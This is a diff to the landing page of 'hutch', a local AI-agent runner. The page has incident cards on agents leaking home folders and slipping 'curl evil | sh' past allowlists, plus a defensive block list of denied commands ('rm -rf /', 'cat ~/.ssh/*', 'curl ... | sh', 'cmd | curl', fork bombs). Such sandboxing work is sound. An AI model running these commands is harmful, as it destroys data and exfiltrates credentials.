@@ -189,79 +189,73 @@
       or top user complaint from 2026 agent deployments.
     </p>
 
-    <div class="receipts-grid">
-      <div class="receipt-card">
-        <div class="receipt-badge-row">
-          <span class="receipt-category">RUNAWAY INVOICE</span>
-          <span class="receipt-source">GitHub Bug Report &middot; May 2026</span>
+    <div class="incident-log">
+      <article class="incident">
+        <div class="incident-meta">
+          <span class="incident-index">01</span>
+          <span class="incident-stamp">Runaway invoice</span>
+          <span class="incident-source">GitHub bug report &middot; May 2026</span>
         </div>
-        <h3>"$447, silently billed overnight"</h3>
-        <p class="receipt-quote">
-          "A coding-agent user awoke to hundreds of dollars charged by an unmonitored recursive loop. Cloud vendors meter your money and inform you via invoice."
-        </p>
-        <div class="receipt-answer">
-          <b>hutch's invariant:</b> Hard step limits, wall-clock kill switches, and per-bot daily token caps enforced at the engine kernel, not the LLM's courtesy.
+        <div class="incident-body">
+          <h3>"$447, silently billed overnight"</h3>
+          <blockquote>"A coding-agent user awoke to hundreds of dollars charged by an unmonitored recursive loop. Cloud vendors meter your money and inform you via invoice."</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Hard step limits, wall-clock kill switches, and per-bot daily token caps enforced at the engine kernel, not the LLM's courtesy.</span></p>
         </div>
-      </div>
+      </article>
 
-      <div class="receipt-card">
-        <div class="receipt-badge-row">
-          <span class="receipt-category">SILENT FAILURE</span>
-          <span class="receipt-cite receipt-source">HN #42749402 &middot; r/n8n</span>
+      <article class="incident">
+        <div class="incident-meta">
+          <span class="incident-index">02</span>
+          <span class="incident-stamp">Silent failure</span>
+          <span class="incident-source">HN #42749402 &middot; r/n8n</span>
         </div>
-        <h3>The scheduled run that quietly never happened</h3>
-        <p class="receipt-quote">
-          "Laptop asleep, DST transition, or daemon crash: scheduled jobs silently vanish while dashboards display deceptive green. Users call it the expensive quiet catastrophe."
-        </p>
-        <div class="receipt-answer">
-          <b>hutch's invariant:</b> Sleep catch-up detects missed intervals and coalesces them into a verified run; IANA-safe cron math prevents double-fires.
+        <div class="incident-body">
+          <h3>The scheduled run that quietly never happened</h3>
+          <blockquote>"Laptop asleep, DST transition, or daemon crash: scheduled jobs silently vanish while dashboards display deceptive green. Users call it the expensive quiet catastrophe."</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Sleep catch-up detects missed intervals and coalesces them into a verified run; IANA-safe cron math prevents double-fires.</span></p>
         </div>
-      </div>
+      </article>
 
-      <div class="receipt-card">
-        <div class="receipt-badge-row">
-          <span class="receipt-category">PRIVACY LEAK</span>
-          <span class="receipt-source">HN #48892468 &middot; HN #49808565</span>
+      <article class="incident">
+        <div class="incident-meta">
+          <span class="incident-index">03</span>
+          <span class="incident-stamp">Privacy leak</span>
+          <span class="incident-source">HN #48892468 &middot; HN #49808565</span>
         </div>
-        <h3>CLI agent uploaded ~/.ssh and home directory</h3>
-        <p class="receipt-quote">
-          "A major CLI agent deterministically uploaded the user's home folder to cloud storage. Another consumer assistant read personal messages and disclosed home addresses."
-        </p>
-        <div class="receipt-answer">
-          <b>hutch's invariant:</b> Isolated workspace path jail with redirected HOME. Critical secrets (<code>~/.ssh</code>, <code>.env</code>, <code>~/.aws</code>) are hard-denied before execution.
+        <div class="incident-body">
+          <h3>CLI agent uploaded ~/.ssh and the home directory</h3>
+          <blockquote>"A major CLI agent deterministically uploaded the user's home folder to cloud storage. Another consumer assistant read personal messages and disclosed home addresses."</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Isolated workspace path jail with redirected HOME. Critical secrets (<code>~/.ssh</code>, <code>.env</code>, <code>~/.aws</code>) are hard-denied before execution.</span></p>
         </div>
-      </div>
+      </article>
 
-      <div class="receipt-card">
-        <div class="receipt-badge-row">
-          <span class="receipt-category">PERMISSION FATIGUE</span>
-          <span class="receipt-source">HN #46268419 &middot; HN #47402197</span>
+      <article class="incident">
+        <div class="incident-meta">
+          <span class="incident-index">04</span>
+          <span class="incident-stamp">Permission fatigue</span>
+          <span class="incident-source">HN #46268419 &middot; HN #47402197</span>
         </div>
-        <h3>Relentless nagging ends in YOLO-mode bypasses</h3>
-        <p class="receipt-quote">
-          "Agents nag until developers switch on <code>--dangerously-skip-permissions</code>. Chained commands like <code>git status &amp;&amp; curl evil | sh</code> bypassed allowlists for a year."
-        </p>
-        <div class="receipt-answer">
-          <b>hutch's invariant:</b> Sticky allows you grant once and can revoke anytime. Compound-command parser decomposes chains and enforces worst-verdict-wins.
+        <div class="incident-body">
+          <h3>Relentless nagging ends in YOLO-mode bypasses</h3>
+          <blockquote>"Agents nag until developers switch on <code>--dangerously-skip-permissions</code>. Chained commands like <code>git status &amp;&amp; curl evil | sh</code> bypassed allowlists for a year."</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Sticky allows you grant once and can revoke anytime. Compound-command parser decomposes chains and enforces worst-verdict-wins.</span></p>
         </div>
-      </div>
+      </article>
 
-      <div class="receipt-card">
-        <div class="receipt-badge-row">
-          <span class="receipt-category">ZERO RESTRICTIONS</span>
-          <span class="receipt-source">HN #49954346 &middot; OpenClaw Post-Mortem</span>
+      <article class="incident">
+        <div class="incident-meta">
+          <span class="incident-index">05</span>
+          <span class="incident-stamp">Zero restrictions</span>
+          <span class="incident-source">HN #49954346 &middot; OpenClaw post-mortem</span>
         </div>
-        <h3>The unconstrained local agent hazard</h3>
-        <p class="receipt-quote">
-          "Open-source tools like OpenClaw shipped with zero out-of-the-box restrictions, allowing models to mutate disk unchecked and lose memory in messy markdown files."
-        </p>
-        <div class="receipt-answer">
-          <b>hutch's invariant:</b> Strict default least-privilege, structured SQLite memory you can inspect and purge, and zero ambient shell permissions.
+        <div class="incident-body">
+          <h3>The unconstrained local agent hazard</h3>
+          <blockquote>"Open-source tools like OpenClaw shipped with zero out-of-the-box restrictions, allowing models to mutate disk unchecked and lose memory in messy markdown files."</blockquote>
+          <p class="incident-answer"><span class="incident-mark"></span><span class="incident-answer-text"><b>Invariant</b> Strict default least-privilege, structured SQLite memory you can inspect and purge, and zero ambient shell permissions.</span></p>
         </div>
-      </div>
+      </article>
     </div>
-  </div>
-</section>
+  </section>
 
 <!-- ============================================================== PILLARS -->
 <section id="pillars" class="alt-bg">
@@ -335,7 +329,6 @@
       Here is how hutch stands apart on sovereignty, budgets, and safety.
     </p>
 
-    <div class="swipe-hint"><span>Swipe horizontally to compare all platforms</span></div>
     <div class="matrix-wrapper">
       <table class="matrix-table">
         <thead>
@@ -350,76 +343,76 @@
         </thead>
         <tbody>
           <tr>
-            <td>Execution Location</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Your machine</span></td>
-            <td>OpenAI Cloud</td>
-            <td>xAI Cloud</td>
-            <td>Meta Cloud</td>
-            <td><span class="pill-check yes">Local</span></td>
+            <td data-label="Feature">Execution Location</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Your machine</span></td>
+            <td data-label="OPENAI DOTS">OpenAI Cloud</td>
+            <td data-label="GROK TEAM BOTS">xAI Cloud</td>
+            <td data-label="META MUSE">Meta Cloud</td>
+            <td data-label="OPENCLAW"><span class="pill-check yes">Local</span></td>
           </tr>
           <tr>
-            <td>Model Freedom</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Any local or hosted</span></td>
-            <td><span class="pill-check no">GPT only</span></td>
-            <td><span class="pill-check no">Grok only</span></td>
-            <td><span class="pill-check no">Muse only</span></td>
-            <td><span class="pill-check yes">Any model</span></td>
+            <td data-label="Feature">Model Freedom</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Any local or hosted</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check no">GPT only</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check no">Grok only</span></td>
+            <td data-label="META MUSE"><span class="pill-check no">Muse only</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check yes">Any model</span></td>
           </tr>
           <tr>
-            <td>Works 100% Offline</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Free mock model</span></td>
-            <td><span class="pill-check no">No</span></td>
-            <td><span class="pill-check no">No</span></td>
-            <td><span class="pill-check no">No</span></td>
-            <td><span class="pill-check yes">Yes</span></td>
+            <td data-label="Feature">Works 100% Offline</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Free mock model</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check no">No</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check no">No</span></td>
+            <td data-label="META MUSE"><span class="pill-check no">No</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check yes">Yes</span></td>
           </tr>
           <tr>
-            <td>Hard Spend &amp; Step Caps</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Per bot, per day</span></td>
-            <td><span class="pill-check no">Plan limits only</span></td>
-            <td><span class="pill-check no">Plan limits only</span></td>
-            <td><span class="pill-check no">Plan limits only</span></td>
-            <td><span class="pill-check no">None (unlimited)</span></td>
+            <td data-label="Feature">Hard Spend &amp; Step Caps</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Per bot, per day</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check no">Plan limits only</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check no">Plan limits only</span></td>
+            <td data-label="META MUSE"><span class="pill-check no">Plan limits only</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check no">None (unlimited)</span></td>
           </tr>
           <tr>
-            <td>Sleep Catch-Up Cron</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Coalesce missed</span></td>
-            <td><span class="pill-check maybe">Cloud cron</span></td>
-            <td><span class="pill-check maybe">Cloud cron</span></td>
-            <td><span class="pill-check maybe">Background</span></td>
-            <td><span class="pill-check no">None</span></td>
+            <td data-label="Feature">Sleep Catch-Up Cron</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Coalesce missed</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check maybe">Cloud cron</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check maybe">Cloud cron</span></td>
+            <td data-label="META MUSE"><span class="pill-check maybe">Background</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check no">None</span></td>
           </tr>
           <tr>
-            <td>Human Approval Gates</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Fail-closed 10m TTL</span></td>
-            <td><span class="pill-check maybe">Basic prompt</span></td>
-            <td><span class="pill-check maybe">Slack prompt</span></td>
-            <td><span class="pill-check maybe">Periodic check</span></td>
-            <td><span class="pill-check no">Zero guardrails</span></td>
+            <td data-label="Feature">Human Approval Gates</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Fail-closed 10m TTL</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check maybe">Basic prompt</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check maybe">Slack prompt</span></td>
+            <td data-label="META MUSE"><span class="pill-check maybe">Periodic check</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check no">Zero guardrails</span></td>
           </tr>
           <tr>
-            <td>Workspace Path Jail</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Strict sandboxing</span></td>
-            <td><span class="pill-check maybe">Cloud VM</span></td>
-            <td><span class="pill-check no">Home folder leaks</span></td>
-            <td><span class="pill-check no">Full access</span></td>
-            <td><span class="pill-check no">Zero isolation</span></td>
+            <td data-label="Feature">Workspace Path Jail</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Strict sandboxing</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check maybe">Cloud VM</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check no">Home folder leaks</span></td>
+            <td data-label="META MUSE"><span class="pill-check no">Full access</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check no">Zero isolation</span></td>
           </tr>
           <tr>
-            <td>Full SQLite Transcripts</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Plain files on disk</span></td>
-            <td><span class="pill-check no">In-app only</span></td>
-            <td><span class="pill-check no">In-app only</span></td>
-            <td><span class="pill-check no">In-app only</span></td>
-            <td><span class="pill-check maybe">Flat markdown</span></td>
+            <td data-label="Feature">Full SQLite Transcripts</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Plain files on disk</span></td>
+            <td data-label="OPENAI DOTS"><span class="pill-check no">In-app only</span></td>
+            <td data-label="GROK TEAM BOTS"><span class="pill-check no">In-app only</span></td>
+            <td data-label="META MUSE"><span class="pill-check no">In-app only</span></td>
+            <td data-label="OPENCLAW"><span class="pill-check maybe">Flat markdown</span></td>
           </tr>
           <tr>
-            <td>Price &amp; Licensing</td>
-            <td class="matrix-hutch"><span class="pill-check yes">Free &middot; MIT</span></td>
-            <td>$20+/mo Subscription</td>
-            <td>SuperGrok Tier</td>
-            <td>Paid tier limits</td>
-            <td><span class="pill-check yes">MIT</span></td>
+            <td data-label="Feature">Price &amp; Licensing</td>
+            <td class="matrix-hutch" data-label="hutch"><span class="pill-check yes">Free &middot; MIT</span></td>
+            <td data-label="OPENAI DOTS">$20+/mo Subscription</td>
+            <td data-label="GROK TEAM BOTS">SuperGrok Tier</td>
+            <td data-label="META MUSE">Paid tier limits</td>
+            <td data-label="OPENCLAW"><span class="pill-check yes">MIT</span></td>
           </tr>
         </tbody>
       </table>
@@ -437,27 +430,27 @@
       Risky actions require human consent; destructive classes never execute under any circumstances.
     </p>
 
-    <div class="code-window">
-      <div class="code-window-tabs">
-        <span class="code-tab active">Hard-Denied Command Classes</span>
-        <span class="code-tab">Compound Command Parser</span>
+    <div class="term">
+      <div class="term-tabs" role="tablist" aria-label="Policy engine">
+        <button class="term-tab" role="tab" id="tab-deny" aria-controls="panel-deny" aria-selected="true">Denied command classes</button>
+        <button class="term-tab" role="tab" id="tab-compound" aria-controls="panel-compound" aria-selected="false" tabindex="-1">Compound command parser</button>
       </div>
-      <div class="code-window-body"><span style="color:var(--text-dim)"># Hard-denied at policy evaluation layer (before execution, always):</span>
-<span class="deny-mark" aria-label="denied"></span> sudo / su / doas                 <span style="color:var(--text-dim)">--\-&gt;gt;gt; agents never escalate system privileges</span>
-<span class="deny-mark" aria-label="denied"></span> rm -rf / &middot; ~ &middot; ..               <span style="color:var(--text-dim)">--\-&gt;gt;gt; outside-workspace filesystem deletions</span>
-<span class="deny-mark" aria-label="denied"></span> cat ~/.ssh/* &middot; .env &middot; ~/.aws    <span style="color:var(--text-dim)">--\-&gt;gt;gt; hard-denied secret and credential paths</span>
-<span class="deny-mark" aria-label="denied"></span> curl ... | sh                    <span style="color:var(--text-dim)">--\-&gt;gt;gt; pipe-to-interpreter code execution</span>
-<span class="deny-mark" aria-label="denied"></span> cmd | curl                      <span style="color:var(--text-dim)">--\-&gt;gt;gt; exfiltration channels</span>
-<span class="deny-mark" aria-label="denied"></span> dd &middot; mkfs &middot; fork bombs &middot; reboot <span style="color:var(--text-dim)">--\-&gt;gt;gt; system destruction commands</span>
-<span class="deny-mark" aria-label="denied"></span> POST/upload flags on fetch tools <span style="color:var(--text-dim)">--\-&gt;gt;gt; data exfiltration channels</span>
 
-<span class="allow-mark">Compound-command awareness:</span>
-<span style="color:var(--text-dim)">"git status &amp;&amp; sudo rm -rf /" -\-Xgt; evaluated as TWO discrete segments.</span>
-<span style="color:var(--amber)">Segment 1 (git status): allowed. Segment 2 (sudo rm -rf /): hard denied.</span>
-<span style="color:var(--red)">-\-Xgt; Worst verdict wins: ENTIRE COMMAND BLOCKED. Zero injection bypass.</span></div>
-    </div>
-  </div>
-</section>
+      <div class="term-body" role="tabpanel" id="panel-deny" aria-labelledby="tab-deny"><pre><span class="t-c"># hard-denied at the policy layer, before execution, always</span>
+<span class="t-p">$</span> sudo / su / doas                  <span class="t-c">agents never escalate privileges</span>
+<span class="t-p">$</span> rm -rf / &middot; ~ &middot; ..                <span class="t-c">deletions outside the workspace</span>
+<span class="t-p">$</span> cat ~/.ssh/* &middot; .env &middot; ~/.aws     <span class="t-c">secret and credential paths</span>
+<span class="t-p">$</span> curl ... | sh                     <span class="t-c">pipe-to-interpreter execution</span>
+<span class="t-p">$</span> cmd | curl                        <span class="t-c">exfiltration channels</span>
+<span class="t-p">$</span> dd &middot; mkfs &middot; fork bombs &middot; reboot  <span class="t-c">system destruction</span>
+<span class="t-p">$</span> POST/upload flags on fetch tools  <span class="t-c">data exfiltration</span></pre></div>
+
+      <div class="term-body" role="tabpanel" id="panel-compound" aria-labelledby="tab-compound" hidden><pre><span class="t-c"># chained commands are split and judged segment by segment</span>
+<span class="t-p">$</span> git status &amp;&amp; sudo rm -rf /
+        <span class="t-c">segment 1: git status</span>          <span class="t-ok">allowed</span>
+        <span class="t-c">segment 2: sudo rm -rf /</span>       <span class="t-bad">denied</span>
+        <span class="t-c">worst verdict wins</span>             <span class="t-bad">entire command blocked</span></pre></div>
+    </div></section>
 
 <!-- ============================================================ QUICKSTART -->
 <section id="quickstart">
@@ -469,30 +462,60 @@
       Switch to Ollama or OpenAI whenever you are ready.
     </p>
 
-    <div class="code-window">
-      <div class="code-window-tabs">
-        <span class="code-tab active">pip</span>
-        <span class="code-tab">uv</span>
-        <span class="code-tab">pipx</span>
+    <div class="term">
+      <div class="term-tabs" role="tablist" aria-label="Install method">
+        <button class="term-tab" role="tab" id="tab-pip" aria-controls="panel-pip" aria-selected="true">pip</button>
+        <button class="term-tab" role="tab" id="tab-uv" aria-controls="panel-uv" aria-selected="false" tabindex="-1">uv</button>
+        <button class="term-tab" role="tab" id="tab-pipx" aria-controls="panel-pipx" aria-selected="false" tabindex="-1">pipx</button>
       </div>
-      <div class="code-window-body"><span style="color:var(--text-dim)"># 1. Install hutch</span>
-git clone https://github.com/K-Arthur/hutch &amp;&amp; cd hutch
-pip install -e .
 
-<span style="color:var(--text-dim)"># 2. Initialize state directory and 3 starter templates (mock model &mdash; no API key needed)</span>
-hutch init
+      <div class="term-body" role="tabpanel" id="panel-pip" aria-labelledby="tab-pip"><pre><span class="t-c"># 1. install from a clone</span>
+<span class="t-p">$</span> git clone https://github.com/K-Arthur/hutch &amp;&amp; cd hutch
+<span class="t-p">$</span> pip install -e .
 
-<span style="color:var(--text-dim)"># 3. Launch Web Studio &amp; Dashboard (interactive chat, approvals, spend meters)</span>
-hutch serve                        <span style="color:var(--accent)">-\-Xgt; http://127.0.0.1:8787</span>
+<span class="t-c"># 2. state directory + 3 starter bots (mock model, no API key)</span>
+<span class="t-p">$</span> hutch init
 
-<span style="color:var(--text-dim)"># 4. Point any bot at a real model whenever you choose</span>
-hutch bot update research-briefing --model <span style="color:var(--blue)">ollama/llama3.2</span>   <span style="color:var(--text-dim)"># or openai/gpt-4o-mini</span>
+<span class="t-c"># 3. dashboard + approvals</span>
+<span class="t-p">$</span> hutch serve            <span class="t-c">http://127.0.0.1:8787</span>
 
-<span style="color:var(--text-dim)"># 5. Run headless daemon for background cron &amp; approval expiry</span>
-hutch daemon</div>
-    </div>
-  </div>
-</section>
+<span class="t-c"># 4. point a bot at a real model whenever you choose</span>
+<span class="t-p">$</span> hutch bot update research-briefing --model ollama/llama3.2
+
+<span class="t-c"># 5. headless daemon: cron, catch-up, approval expiry</span>
+<span class="t-p">$</span> hutch daemon</pre></div>
+
+      <div class="term-body" role="tabpanel" id="panel-uv" aria-labelledby="tab-uv" hidden><pre><span class="t-c"># 1. install from a clone</span>
+<span class="t-p">$</span> git clone https://github.com/K-Arthur/hutch &amp;&amp; cd hutch
+<span class="t-p">$</span> uv venv &amp;&amp; uv pip install -e .
+
+<span class="t-c"># 2. state directory + 3 starter bots (mock model, no API key)</span>
+<span class="t-p">$</span> uv run hutch init
+
+<span class="t-c"># 3. dashboard + approvals</span>
+<span class="t-p">$</span> uv run hutch serve     <span class="t-c">http://127.0.0.1:8787</span>
+
+<span class="t-c"># 4. point a bot at a real model whenever you choose</span>
+<span class="t-p">$</span> uv run hutch bot update research-briefing --model ollama/llama3.2
+
+<span class="t-c"># 5. headless daemon: cron, catch-up, approval expiry</span>
+<span class="t-p">$</span> uv run hutch daemon</pre></div>
+
+      <div class="term-body" role="tabpanel" id="panel-pipx" aria-labelledby="tab-pipx" hidden><pre><span class="t-c"># 1. install isolated, from the repo</span>
+<span class="t-p">$</span> pipx install git+https://github.com/K-Arthur/hutch
+
+<span class="t-c"># 2. state directory + 3 starter bots (mock model, no API key)</span>
+<span class="t-p">$</span> hutch init
+
+<span class="t-c"># 3. dashboard + approvals</span>
+<span class="t-p">$</span> hutch serve            <span class="t-c">http://127.0.0.1:8787</span>
+
+<span class="t-c"># 4. point a bot at a real model whenever you choose</span>
+<span class="t-p">$</span> hutch bot update research-briefing --model ollama/llama3.2
+
+<span class="t-c"># 5. headless daemon: cron, catch-up, approval expiry</span>
+<span class="t-p">$</span> hutch daemon</pre></div>
+    </div></section>
 
 <!-- =============================================================== FAQ -->
 <section id="faq" class="alt-bg">
@@ -500,41 +523,31 @@ hutch daemon</div>
     <div class="section-label">Frequently Asked Questions</div>
     <h2 class="section-heading">Fair questions with honest answers</h2>
 
-    <div class="faq-container">
-      <div class="faq-box">
-        <details>
+    <div class="faq-list">
+      <details class="faq-item">
           <summary>Do I need an API key, credit card, or GPU?</summary>
           <p>No. hutch includes a built-in deterministic mock runtime that runs the full tool and approval pipeline completely offline for free. When you want real intelligence, connect any local model (Ollama, llama.cpp on CPU or GPU) or any OpenAI-compatible endpoint with an API key.</p>
         </details>
-      </div>
 
-      <div class="faq-box">
-        <details>
+      <details class="faq-item">
           <summary>Does hutch phone home or send telemetry?</summary>
           <p>No. Zero telemetry, zero phone-home, zero accounts, and zero analytics. Everything lives inside <code>~/.local/state/hutch</code> on your disk in SQLite and JSONL files you can inspect, back up, or delete.</p>
         </details>
-      </div>
 
-      <div class="faq-box">
-        <details>
+      <details class="faq-item">
           <summary>How does hutch differ from OpenClaw?</summary>
           <p>OpenClaw provided a lightweight local agent but shipped with zero out-of-the-box guardrails, ambient shell authority, and flat markdown memory that suffered desync. hutch provides isolated workspace path jails, sticky human-in-the-loop approvals, structured SQLite memory you can inspect, and hard token budget caps.</p>
         </details>
-      </div>
 
-      <div class="faq-box">
-        <details>
+      <details class="faq-item">
           <summary>What happens if my laptop goes to sleep during a scheduled run?</summary>
           <p>hutch tracks schedule intervals in the bot's IANA timezone. When your machine wakes up, the scheduler detects missed windows and triggers a single catch-up run tagged with <code>+N missed windows</code>, preventing silent run loss and avoiding duplicate execution stampedes.</p>
         </details>
-      </div>
 
-      <div class="faq-box">
-        <details>
+      <details class="faq-item">
           <summary>What happens when a browser bot hits a CAPTCHA or MFA wall?</summary>
           <p>hutch emits a pause-to-human event and waits for you. Bots never hallucinate clicks on verification walls or try to solve CAPTCHAs. Because Chromium profiles persist per bot, logins survive between runs.</p>
         </details>
-      </div>
     </div>
   </div>
 </section>
@@ -610,6 +623,29 @@ if (copyBtn) {
     setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000);
   });
 }
+
+// Terminal tabs (role=tablist, arrow-key navigable)
+document.querySelectorAll('.term-tabs').forEach(tablist => {
+  const tabs = [...tablist.querySelectorAll('[role=tab]')];
+  const select = tab => {
+    tabs.forEach(tb => {
+      const on = tb === tab;
+      tb.setAttribute('aria-selected', String(on));
+      tb.tabIndex = on ? 0 : -1;
+      document.getElementById(tb.getAttribute('aria-controls')).hidden = !on;
+    });
+    tab.focus();
+  };
+  tabs.forEach((tab, i) => {
+    tab.addEventListener('click', () => select(tab));
+    tab.addEventListener('keydown', ev => {
+      const dir = ev.key === 'ArrowRight' ? 1 : ev.key === 'ArrowLeft' ? -1 : 0;
+      if (!dir) return;
+      ev.preventDefault();
+      select(tabs[(i + dir + tabs.length) % tabs.length]);
+    });
+  });
+});
 
 // Mobile drawer toggle (aria-expanded, Escape to close, focus returned)
 const menuBtn = document.getElementById('menu-btn');
